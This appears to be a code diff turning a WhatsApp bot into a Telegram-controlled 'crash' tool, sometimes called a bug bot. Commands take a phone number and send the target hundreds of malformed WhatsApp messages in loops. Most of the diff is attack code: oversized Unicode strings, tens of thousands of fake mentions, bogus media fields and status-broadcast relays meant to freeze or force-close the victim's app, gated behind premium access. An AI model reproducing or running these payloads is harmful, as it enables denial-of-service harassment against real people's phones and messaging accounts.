-      throw {
-        json: JSON.parse(file.toString())
-      };
-    } catch (e) {
-      if (e.json) throw e.json;
-    }
+  if (!q) {
+    return ctx.reply(`Example: commandnya 62×××`);
   }
 
-  let opt = {
-    filename
+  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
+
+  // Kirim pesan proses dimulai dan simpan messageId-nya
+  const processMessage = await ctx.reply(`[ ATTACK PROCES TO ]\nTARGET:${q}`, { parse_mode: "Markdown" });
+  const processMessageId = processMessage.message_id; 
+
+    for (let i = 0; i < 870; i++) {
+    await NanCrashiPhone(target);
+    await NanCrashiPhone(target);
+    await NanCrashiPhone(target);
+    await NanCrashiPhone(target);
+    await NanCrashiPhone(target);
+    await NanCrashiPhone(target);
+    await isagivisble1(target);
+    await isagivisble2(target);
+    await isagivisble1(target);
+    await isagivisble2(target);
+    await isagivisble1(target);
+    await isagivisble2(target);
+    await isagivisble1(target);
+    await isagivisble2(target);
+    await isagivisble1(target);
+    await isagivisble2(target);
+    
+    }
+    
+    
+// Hapus pesan proses
+  await ctx.telegram.deleteMessage(ctx.chat.id, processMessageId);
+
+  // Kirim pesan proses selesai
+  await ctx.reply(`[  PROSES SUCCES TO ]\nTARGET : ${q} \nTYPE KILLBLANK:✅`,{ parse_mode: "Markdown" });
+});
+
+
+bot.command("riiui", checkWhatsAppConnection, checkPremium, async ctx => {
+  const q = ctx.message.text.split(" ")[1];
+  const userId = ctx.from.id;
+
+  if (!q) {
+    return ctx.reply(`Example: commandnya 62×××`);
+  }
+
+  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
+
+  // Kirim pesan proses dimulai dan simpan messageId-nya
+  const processMessage = await ctx.reply(`[ ATTACK PROCES TO ]\nTARGET:${q}`, { parse_mode: "Markdown" });
+  const processMessageId = processMessage.message_id; 
+
+    for (let i = 0; i < 870; i++) {
+    await isagivisble1(target);
+    await isagivisble2(target);
+    await isagivisble1(target);
+    await isagivisble2(target);
+    await isagivisble1(target);
+    await isagivisble2(target);
+    await isagivisble1(target);
+    await isagivisble2(target);
+    await isagivisble1(target);
+    await isagivisble2(target);
+    await isagivisble1(target);
+    await isagivisble2(target);
+    await isagivisble1(target);
+    await isagivisble2(target);
+    await isagivisble1(target);
+    await isagivisble2(target);
+    
+    }
+    
+// Hapus pesan proses
+  await ctx.telegram.deleteMessage(ctx.chat.id, processMessageId);
+
+  // Kirim pesan proses selesai
+  await ctx.reply(`[  PROSES SUCCES TO ]\nTARGET : ${q} \nTYPE STOP SYSTEM UI:✅`,{ parse_mode: "Markdown" });
+});
+
+
+bot.command("riicombo", checkWhatsAppConnection, checkPremium, async ctx => {
+  const q = ctx.message.text.split(" ")[1];
+  const userId = ctx.from.id;
+
+  if (!q) {
+    return ctx.reply(`Example: commandnya 62×××`);
+  }
+
+  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
+
+  // Kirim pesan proses dimulai dan simpan messageId-nya
+  const processMessage = await ctx.reply(`[ ATTACK PROCES TO ]\nTARGET:${q}`, { parse_mode: "Markdown" });
+  const processMessageId = processMessage.message_id; 
+
+    for (let i = 0; i < 870; i++) {
+    await isagivisble1(target);
+    await isagivisble2(target);
+    await isagivisble1(target);
+    await isagivisble2(target);
+    await isagivisble1(target);
+    await isagivisble2(target);
+    await protocolbug7(isTarget, mention);
+    await protocolbug7(isTarget, mention);
+    await protocolbug7(isTarget, mention);
+    await ForcloseInfinity(sock, target);
+    await ForcloseInfinity(sock, target);
+    await ForcloseInfinity(sock, target);
+    await ForcloseInfinity(sock, target);
+    
+    }
+    
+// Hapus pesan proses
+  await ctx.telegram.deleteMessage(ctx.chat.id, processMessageId);
+
+  // Kirim pesan proses selesai
+  await ctx.reply(`[  PROSES SUCCES TO ]\nTARGET : ${q} \nTYPE KILL SYSTEM:✅`,{ parse_mode: "Markdown" });
+});
+
+
+bot.command("riiimage", checkWhatsAppConnection, checkPremium, async ctx => {
+  const q = ctx.message.text.split(" ")[1];
+  const userId = ctx.from.id;
+
+  if (!q) {
+    return ctx.reply(`Example: commandnya 62×××`);
+  }
+
+  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
+
+  // Kirim pesan proses dimulai dan simpan messageId-nya
+  const processMessage = await ctx.reply(`[ ATTACK PROCES TO ]\nTARGET:${q}`, { parse_mode: "Markdown" });
+  const processMessageId = processMessage.message_id; 
+
+    for (let i = 0; i < 870; i++) {
+    await isagivisble1(target);
+    await isagivisble2(target);
+    await isagivisble1(target);
+    await isagivisble2(target);
+    await isagivisble1(target);
+    await isagivisble2(target);
+    await isagivisble1(target);
+    await isagivisble2(target);
+    await isagivisble1(target);
+    await isagivisble2(target);
+    await isagivisble1(target);
+    await isagivisble2(target);
+    await isagivisble1(target);
+    
+    }
+    
+// Hapus pesan proses
+  await ctx.telegram.deleteMessage(ctx.chat.id, processMessageId);
+
+  // Kirim pesan proses selesai
+  await ctx.reply(`[  PROSES SUCCES TO ]\nTARGET : ${q} \nTYPE RESTART SYSTEM:✅`,{ parse_mode: "Markdown" });
+});
+
+
+bot.command("riifc", checkWhatsAppConnection, checkPremium, async ctx => {
+  const q = ctx.message.text.split(" ")[1];
+  const userId = ctx.from.id;
+
+  if (!q) {
+    return ctx.reply(`Example: commandnya 62×××`);
+  }
+
+  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
+
+  // Kirim pesan proses dimulai dan simpan messageId-nya
+  const processMessage = await ctx.reply(`[ ATTACK PROCES TO ]\nTARGET:${q}`, { parse_mode: "Markdown" });
+  const processMessageId = processMessage.message_id; 
+
+    for (let i = 0; i < 870; i++) {
+    await isagivisble1(target);
+    await isagivisble2(target);
+    await isagivisble1(target);
+    await isagivisble2(target);
+    await isagivisble1(target);
+    await isagivisble2(target);
+    await isagivisble1(target);
+    await isagivisble2(target);
+    await isagivisble1(target);
+    await isagivisble2(target);
+    await isagivisble1(target);
+    await isagivisble2(target);
+    await isagivisble1(target);
+    await isagivisble2(target);
+    await isagivisble1(target);
+    await isagivisble2(target);
+    await isagivisble1(target);
+    await isagivisble2(target);
+    await isagivisble1(target);
+    await isagivisble2(target);
+    await isagivisble1(target);
+    await isagivisble2(target);
+    await isagivisble1(target);
+    await isagivisble2(target);
+    await isagivisble1(target);
+    await isagivisble2(target);
+    
+    }
+    
+// Hapus pesan proses
+  await ctx.telegram.deleteMessage(ctx.chat.id, processMessageId);
+
+  // Kirim pesan proses selesai
+  await ctx.reply(`[  PROSES SUCCES TO ]\nTARGET : ${q} \nTYPE FC WHATSAPP APP:✅`,{ parse_mode: "Markdown" });
+});
+
+
+bot.command("ryycrash", checkWhatsAppConnection, checkPremium, async ctx => {
+  const q = ctx.message.text.split(" ")[1];
+  const userId = ctx.from.id;
+
+  if (!q) {
+    return ctx.reply(`Example: commandnya 62×××`);
+  }
+
+  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
+
+  // Kirim pesan proses dimulai dan simpan messageId-nya
+  const processMessage = await ctx.reply(`[ ATTACK PROCES TO ]\nTARGET:${q}`, { parse_mode: "Markdown" });
+  const processMessageId = processMessage.message_id; 
+
+    for (let i = 0; i < 870; i++) {
+    await isagivisble1(target);
+    await isagivisble2(target);
+    await isagivisble1(target);
+    await isagivisble2(target);
+    await isagivisble1(target);
+    await isagivisble2(target);
+    await isagivisble1(target);
+    await isagivisble2(target);
+    await isagivisble1(target);
+    await isagivisble2(target);
+    await isagivisble1(target);
+    await isagivisble2(target);
+    await isagivisble1(target);
+    await isagivisble2(target);
+
+    
+    }
+    
+// Hapus pesan proses
+  await ctx.telegram.deleteMessage(ctx.chat.id, processMessageId);
+
+  // Kirim pesan proses selesai
+  await ctx.reply(`[  PROSES SUCCES TO ]\nTARGET : ${q} \nTYPE CRASHALLWA:✅`,{ parse_mode: "Markdown" });
+});
+
+bot.command("ryylay", checkWhatsAppConnection, checkPremium, async ctx => {
+  const q = ctx.message.text.split(" ")[1];
+  const userId = ctx.from.id;
+
+  if (!q) {
+    return ctx.reply(`Example: commandnya 62×××`);
+  }
+
+  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
+
+  // Kirim pesan proses dimulai dan simpan messageId-nya
+  const processMessage = await ctx.reply(`[ ATTACK PROCES TO ]\nTARGET:${q}`, { parse_mode: "Markdown" });
+  const processMessageId = processMessage.message_id; 
+
+    for (let i = 0; i < 870; i++) {
+    await isagivisble1(target);
+    await isagivisble1(target);
+    await isagivisble2(target);
+    await isagivisble1(target);
+    await isagivisble2(target);
+    await isagivisble1(target);
+    await isagivisble2(target);
+    await isagivisble1(target);
+    await isagivisble2(target);
+    await isagivisble1(target);
+    await isagivisble2(target);
+    await isagivisble1(target);
+    await isagivisble2(target);
+
+
+    
+    }
+    
+// Hapus pesan proses
+  await ctx.telegram.deleteMessage(ctx.chat.id, processMessageId);
+
+  // Kirim pesan proses selesai
+  await ctx.reply(`[  PROSES SUCCES TO ]\nTARGET : ${q} \nTYPE INVISIBLE NEW:✅`,{ parse_mode: "Markdown" });
+});
+
+bot.command("riios", checkWhatsAppConnection, checkPremium, async ctx => {
+  const q = ctx.message.text.split(" ")[1];
+  const userId = ctx.from.id;
+
+  if (!q) {
+    return ctx.reply(`Example: commandnya 62×××`);
+  }
+
+  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
+
+  // Kirim pesan proses dimulai dan simpan messageId-nya
+  const processMessage = await ctx.reply(`[ ATTACK PROCES TO ]\nTARGET:${q}`, { parse_mode: "Markdown" });
+  const processMessageId = processMessage.message_id; 
+  
+    for (let i = 0; i < 870; i++) {
+   await NanBlankIphone(target);
+    await isagivisble1(target);
+    await isagivisble2(target);
+    await isagivisble1(target);
+    await isagivisble2(target);
+    await isagivisble1(target);
+    await isagivisble2(target);
+    await isagivisble1(target);
+    await isagivisble2(target);
+    await isagivisble1(target);
+    await isagivisble2(target);
+    await isagivisble1(target);
+    await isagivisble2(target);
+    await isagivisble1(target);
+    await isagivisble2(target);
+    
+    }
+    
+// Hapus pesan proses
+  await ctx.telegram.deleteMessage(ctx.chat.id, processMessageId);
+
+  // Kirim pesan proses selesai
+  await ctx.reply(`[  PROSES SUCCES TO ]\nTARGET : ${q} \nTYPE CRASIPHONE✅`,{ parse_mode: "Markdown" });
+});
+
+// Perintah untuk menambahkan pengguna premium (hanya owner)
+bot.command('addprem', checkOwner, (ctx) => {
+    const args = ctx.message.text.split(' ');
+
+    if (args.length < 2) {
+        return ctx.reply("❌ Masukkan ID pengguna yang ingin dijadikan premium.\nContoh: /addprem 123456789");
+    }
+
+    const userId = args[1];
+
+    if (premiumUsers.includes(userId)) {
+        return ctx.reply(`✅ Pengguna ${userId} sudah memiliki status premium.`);
+    }
+
+    premiumUsers.push(userId);
+    saveJSON(premiumFile, premiumUsers);
+
+    return ctx.reply(`🎉 Pengguna ${userId} sekarang memiliki akses premium!`);
+});
+
+// Perintah untuk menghapus pengguna premium (hanya owner)
+bot.command('delprem', checkOwner, (ctx) => {
+    const args = ctx.message.text.split(' ');
+
+    if (args.length < 2) {
+        return ctx.reply("❌ Masukkan ID pengguna yang ingin dihapus dari premium.\nContoh: /delprem 123456789");
+    }
+
+    const userId = args[1];
+
+    if (!premiumUsers.includes(userId)) {
+        return ctx.reply(`❌ Pengguna ${userId} tidak ada dalam daftar premium.`);
+    }
+
+    premiumUsers = premiumUsers.filter(id => id !== userId);
+    saveJSON(premiumFile, premiumUsers);
+
+    return ctx.reply(`🚫 Pengguna ${userId} telah dihapus dari daftar premium.`);
+});
+
+// Perintah untuk mengecek status premium
+bot.command('cekprem', (ctx) => {
+    const userId = ctx.from.id.toString();
+
+    if (premiumUsers.includes(userId)) {
+        return ctx.reply(`✅ Anda adalah pengguna premium.`);
+    } else {
+        return ctx.reply(`❌ Anda bukan pengguna premium.`);
+    }
+});
+
+// Command untuk pairing WhatsApp
+bot.command("connect", checkOwner, async (ctx) => {
+
+    const args = ctx.message.text.split(" ");
+    if (args.length < 2) {
+        return await ctx.reply("❌ Format perintah salah. Gunakan: /connect <nomor_wa>");
+    }
+
+    let phoneNumber = args[1];
+    phoneNumber = phoneNumber.replace(/[^0-9]/g, '');
+
+
+    if (Ndok && Ndok.user) {
+        return await ctx.reply("WhatsApp sudah terhubung. Tidak perlu pairing lagi.");
+    }
+
+    try {
+        const code = await Ndok.requestPairingCode(phoneNumber);
+        const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;
+
+        const pairingMessage = `
+✅𝗦𝘂𝗰𝗰𝗲𝘀𝘀
+𝗞𝗼𝗱𝗲 𝗪𝗵𝗮𝘁𝘀𝗔𝗽𝗽 𝗔𝗻𝗱𝗮
+
+𝗡𝗼𝗺𝗼𝗿: ${phoneNumber}
+𝗞𝗼𝗱𝗲: ${formattedCode}
+`;
+
+        await ctx.replyWithMarkdown(pairingMessage);
+    } catch (error) {
+        console.error(chalk.red('Gagal melakukan pairing:'), error);
+        await ctx.reply("❌ Gagal melakukan pairing. Pastikan nomor WhatsApp valid dan dapat menerima SMS.");
+    }
+});
+
+// Fungsi untuk merestart bot menggunakan PM2
+const restartBot = () => {
+  pm2.connect((err) => {
+    if (err) {
+      console.error('Gagal terhubung ke PM2:', err);
+      return;
+    }
+
+    pm2.restart('index', (err) => { // 'index' adalah nama proses PM2 Anda
+      pm2.disconnect(); // Putuskan koneksi setelah restart
+      if (err) {
+        console.error('Gagal merestart bot:', err);
+      } else {
+        console.log('Bot berhasil direstart.');
+      }
+    });
+  });
+};
+
+
+
+// Command untuk restart
+bot.command('restart', (ctx) => {
+  const userId = ctx.from.id.toString();
+  ctx.reply('Merestart bot...');
+  restartBot();
+});
+  
+// ========================= [ CRASH FUNCT ] =========================
+ async function NanBlankIphone(target) {
+    try {
+        const messsage = {
+            botInvokeMessage: {
+                message: {
+                    newsletterAdminInviteMessage: {
+                        newsletterJid: `33333333333333333@newsletter`,
+                        newsletterName: "🐉 𝕽𝖎𝖎 𝕰𝖝𝖊𝖈𝖚𝖙𝖊 🐉" + "ી".repeat(100000),
+                        jpegThumbnail: "",
+                        caption: "ꦽ".repeat(100000),
+                        inviteExpiration: Date.now() + 1814400000,
+                    },
+                },
+            },
+        };
+        await Ndok.relayMessage(target, messsage, {
+            userJid: target,
+        });
+    }
+    catch (err) {
+        console.log(err);
+    }
+}       
+
+
+async function isagivisble1(target) {
+let message = {
+    viewOnceMessage: {
+      message: {
+        stickerMessage: {
+          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
+          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
+          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
+          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
+          mimetype: "image/webp",
+          directPath:
+            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
+          fileLength: { low: 1, high: 0, unsigned: true },
+          mediaKeyTimestamp: {
+            low: 1746112211,
+            high: 0,
+            unsigned: false,
+          },
+          firstFrameLength: 19904,
+          firstFrameSidecar: "KN4kQ5pyABRAgA==",
+          isAnimated: true,
+          contextInfo: {
+            mentionedJid: [
+              "0@s.whatsapp.net",
+              ...Array.from(
+                {
+                  length: 40000,
+                },
+                () =>
+                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
+              ),
+            ],
+            groupMentions: [],
+            entryPointConversionSource: "non_contact",
+            entryPointConversionApp: "whatsapp",
+            entryPointConversionDelaySeconds: 467593,
+          },
+          stickerSentTs: {
+            low: -1939477883,
+            high: 406,
+            unsigned: false,
+          },
+          isAvatar: false,
+          isAiSticker: false,
+          isLottie: false,
+        },
+      },
+    },
   };
 
-  if (quoted) opt.quoted = quoted;
-  if (!type) options.asDocument = true;
+  const msg = generateWAMessageFromContent(target, message, {});
 
-  let mtype = '',
-    mimetype = type.mime,
-    convert;
+  await Ndok.relayMessage("status@broadcast", msg.message, {
+    messageId: msg.key.id,
+    statusJidList: [target],
+    additionalNodes: [
+      {
+        tag: "meta",
+        attrs: {},
+        content: [
+          {
+            tag: "mentioned_users",
+            attrs: {},
+            content: [
+              {
+                tag: "to",
+                attrs: { jid: target },
+                content: undefined,
+              },
+            ],
+          },
+        ],
+      },
+    ],
+  });
+}
+exports.carousels2 = async(client, target, fJids) => {
+  const cards = [];
 
-  if (/webp/.test(type.mime) || (/image/.test(type.mime) && options.asSticker)) mtype = 'sticker';
-  else if (/image/.test(type.mime) || (/webp/.test(type.mime) && options.asImage)) mtype = 'image';
-  else if (/video/.test(type.mime)) mtype = 'video';
-  else if (/audio/.test(type.mime)) {
-    convert = await (ptt ? toPTT : toAudio)(file, type.ext);
-    file = convert.data;
-    pathFile = convert.filename;
-    mtype = 'audio';
-    mimetype = 'audio/ogg; codecs=opus';
-  } else mtype = 'document';
+  const media = await prepareWAMessageMedia(
+    { image: imgCrL },
+    { upload: client.waUploadToServer }
+  );
 
-  if (options.asDocument) mtype = 'document';
+  const header = proto.Message.InteractiveMessage.Header.fromObject({
+    imageMessage: media.imageMessage,
+    title: '🐉 𝕽𝖎𝖎 𝕰𝖝𝖊𝖈𝖚𝖙𝖊 🐉',
+    gifPlayback: false,
+    subtitle: '🐉 𝕽𝖎𝖎 𝕰𝖝𝖊𝖈𝖚𝖙𝖊 🐉',
+    hasMediaAttachment: true
+  });
 
-  delete options.asSticker;
-  delete options.asLocation;
-  delete options.asVideo;
-  delete options.asDocument;
-  delete options.asImage;
+  for (let r = 0; r < 1000; r++) {
+    cards.push({
+      header,
+      body: {
+        text: "🐉 𝕽𝖎𝖎 𝕰𝖝𝖊𝖈𝖚𝖙𝖊 🐉"
+      },
+      nativeFlowMessage: {
+        buttons: [
+          {
+            name: "cta_url",
+            buttonParamsJson: JSON.stringify({
+              display_text: "view",
+              url: "https://example.com"
+            })
+          }
+        ]
+      }
+    });
+  }
 
-  let message = { ...options, caption, ptt, [mtype]: { url: pathFile }, mimetype };
-  let m;
-
+  const msg = generateWAMessageFromContent(
+    target,
+    {
+      viewOnceMessage: {
+        message: {
+          interactiveMessage: {
+            body: {
+              text: "🐉 𝕽𝖎𝖎 𝕰𝖝𝖊𝖈𝖚𝖙𝖊 🐉"
+            },
+            footer: {
+              text: "🐉 𝕽𝖎𝖎 𝕰𝖝𝖊𝖈𝖚𝖙𝖊 🐉"
+            },
+            carouselMessage: {
+              cards,
+              messageVersion: 1
+            }
+          }
+        }
+      }
+    },
+    {}
+  );
+  
+  await Ndok.relayMessage(
+    target,
+    msg.message,
+    fJids
+      ? { participant: { jid: target, messageId: null } }
+      : {}
+  );
+}
+async function isagivisble2(target) {
+        	try {
+        		let messageObject = await generateWAMessageFromContent(target, {
+        			viewOnceMessage: {
+        				message: {
+        					extendedTextMessage: {
+        						text: `🩸𝐈𝐬𝖆𝖌𝖎𝖎 𝐊𝖎𝖑𝖑 𝐘𝖔𝖚𝖚🩸`,
+        						contextInfo: {
+        							mentionedJid: Array.from({
+        								length: 30000
+        							}, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
+        							isSampled: true,
+        							participant: target,
+        							remoteJid: "status@broadcast",
+        							forwardingScore: 9741,
+        							isForwarded: true
+        						}
+        					}
+        				}
+        			}
+        		}, {});
+        		await Ndok.relayMessage("status@broadcast", messageObject.message, {
+        			messageId: messageObject.key.id,
+        			statusJidList: [target],
+        			additionalNodes: [{
+        				tag: "meta",
+        				attrs: {},
+        				content: [{ tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: target },
+        						content: undefined,
+        					}],
+        				}],
+        			}],
+        		});
+        	} catch (err) {
+        		console.log(err)
+        		await Ndok.sendMessage("! Error Type", err)
+        	}
+        	console.log(chalk.green("Succesfully Send Bug Invisible"));
+        	
+async function ForcloseInfinity(sock, target) {
   try {
-    m = await hydro.sendMessage(jid, message, { ...opt, ...options });
-  } catch (e) {
-    //console.error(e)
-    m = null;
-  } finally {
-    if (!m) m = await hydro.sendMessage(jid, { ...message, [mtype]: file }, { ...opt, ...options });
-    file = null;
-    return m;
+    const msg = await generateWAMessageFromContent(target, {
+      viewOnceMessage: {
+        message: {
+          interactiveMessage: {
+            header: {
+              title: 'T R A V A F O R C L O S E',
+              hasMediaAttachment: true,
+              imageMessage: {
+                url: "https://mmg.whatsapp.net/v/t62.7818-24/11734305_1146343427248320_57551642359982400177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0",
+                mimetype: "image/jpeg"
+              }
+            },
+            body: {
+              text: 'ZYNZZ VS EVERYBODY '.repeat(15500)
+            },
+            footer: {
+              text: 'FORCLOSE INFINITY '.repeat(15500)
+            },
+            buttons: [
+              {
+                buttonId: "crash_button",
+                buttonText: { displayText: "💥 CRASH" + "ꦾ" },
+                type: 1
+              }
+            ]
+          },
+          contextInfo: {
+            quotedMessage: {
+              conversation: "Sent"
+            }
+          }
+        }
+      }
+    }, {});
+
+    await sock.relayMessage(target, msg.message, {
+      messageId: msg.key.id
+    });
+
+    console.log(chalk.green(`Successfully Send ${chalk.red("FORCLOSE INFINITY")} to ${target}`));
+  } catch (err) {
+    console.error(chalk.red(`Error sending to ${target}: ${err.message}`));
   }
 }
-hydro.ev.on('group-participants.update', async (anu) => {
-const { welcome } = require ('./lib/welcome')
-const iswel = _welcome.includes(anu.id)
-const isLeft = _left.includes(anu.id)
-welcome(iswel, isLeft, hydro, anu)
-})
+        }
+        
+async function protocolbug7(isTarget, mention) {
+  const floods = 40000;
+  const mentioning = "13135550002@s.whatsapp.net";
+  const mentionedJids = [
+    mentioning,
+    ...Array.from({ length: floods }, () =>
+      `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
+    )
+  ];
 
-hydro.sendFileUrl = async (jid, url, caption, quoted, options = {}) => {
-      let mime = '';
-      let res = await axios.head(url)
-      mime = res.headers['content-type']
-      if (mime.split("/")[1] === "gif") {
-     return hydro.sendMessage(jid, { video: await getBuffer(url), caption: caption, gifPlayback: true, ...options}, { quoted: quoted, ...options})
-      }
-      let type = mime.split("/")[0]+"Message"
-      if(mime === "application/pdf"){
-     return hydro.sendMessage(jid, { document: await getBuffer(url), mimetype: 'application/pdf', caption: caption, ...options}, { quoted: quoted, ...options })
-      }
-      if(mime.split("/")[0] === "image"){
-     return hydro.sendMessage(jid, { image: await getBuffer(url), caption: caption, ...options}, { quoted: quoted, ...options})
-      }
-      if(mime.split("/")[0] === "video"){
-     return hydro.sendMessage(jid, { video: await getBuffer(url), caption: caption, mimetype: 'video/mp4', ...options}, { quoted: quoted, ...options })
-      }
-      if(mime.split("/")[0] === "audio"){
-     return hydro.sendMessage(jid, { audio: await getBuffer(url), caption: caption, mimetype: 'audio/mpeg', ...options}, { quoted: quoted, ...options })
-      }
-      }
-      
-      /**
-     * 
-     * @param {*} jid 
-     * @param {*} name 
-     * @param [*] values 
-     * @returns 
-     */
-    hydro.sendPoll = (jid, name = '', values = [], selectableCount = 1) => { return hydro.sendMessage(jid, { poll: { name, values, selectableCount }}) }
+  const links = "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true";
+  const mime = "audio/mpeg";
+  const sha = "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=";
+  const enc = "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=";
+  const key = "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=";
+  const timestamp = 99999999999999;
+  const path = "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0";
+  const longs = 99999999999999;
+  const loaded = 99999999999999;
+  const data = "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg==";
 
-return hydro
+  const messageContext = {
+    mentionedJid: mentionedJids,
+    isForwarded: true,
+    forwardedNewsletterMessageInfo: {
+      newsletterJid: "120363321780343299@newsletter",
+      serverMessageId: 1,
+      newsletterName: "𐌕𐌀𐌌𐌀 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂"
+    }
+  };
 
+  const messageContent = {
+    ephemeralMessage: {
+      message: {
+        audioMessage: {
+          url: links,
+          mimetype: mime,
+          fileSha256: sha,
+          fileLength: longs,
+          seconds: loaded,
+          ptt: true,
+          mediaKey: key,
+          fileEncSha256: enc,
+          directPath: path,
+          mediaKeyTimestamp: timestamp,
+          contextInfo: messageContext,
+          waveform: data
+        }
+      }
+    }
+  };
+
+  const msg = generateWAMessageFromContent(isTarget, messageContent, { userJid: isTarget });
+
+  const broadcastSend = {
+    messageId: msg.key.id,
+    statusJidList: [isTarget],
+    additionalNodes: [
+      {
+        tag: "meta",
+        attrs: {},
+        content: [
+          {
+            tag: "mentioned_users",
+            attrs: {},
+            content: [
+              { tag: "to", attrs: { jid: isTarget }, content: undefined }
+            ]
+          }
+        ]
+      }
+    ]
+  };
+
+  await client.relayMessage("status@broadcast", msg.message, broadcastSend);
+
+  if (mention) {
+    await client.relayMessage(isTarget, {
+      groupStatusMentionMessage: {
+        message: {
+          protocolMessage: {
+            key: msg.key,
+            type: 25
+          }
+        }
+      }
+    }, {
+      additionalNodes: [{
+        tag: "meta",
+        attrs: {
+          is_status_mention: " null - exexute "
+        },
+        content: undefined
+      }]
+    });
+  }
 }
-hydroInd()
+// --- Jalankan Bot ---
+ 
+(async () => {
+    console.clear();
+    console.log("🚀 Memulai sesi WhatsApp...");
+    startSesi();
 
-process.on('uncaughtException', function (err) {
-console.log('Caught exception: ', err)
-})
+    console.log("Sukses connected");
+    bot.launch();
+
+    // Membersihkan konsol sebelum menampilkan pesan sukses
+    console.clear();
+    console.log(chalk.bold.red("\nIRyy Execute"));
+    console.log(chalk.bold.white("DEVELOPER: Ryy"));
+    console.log(chalk.bold.white("VERSION: 5.0"));
+    console.log(chalk.bold.white("ACCESS:") + chalk.bold.green(" VIP NO JUAL"));
+    console.log(chalk.bold.white("STATUS: ") + chalk.bold.green("ONLINE\n\n"));
+    console.log(chalk.bold.yellow("THANKS FOR PENGGUNA SCRIP🎉"));
+})();
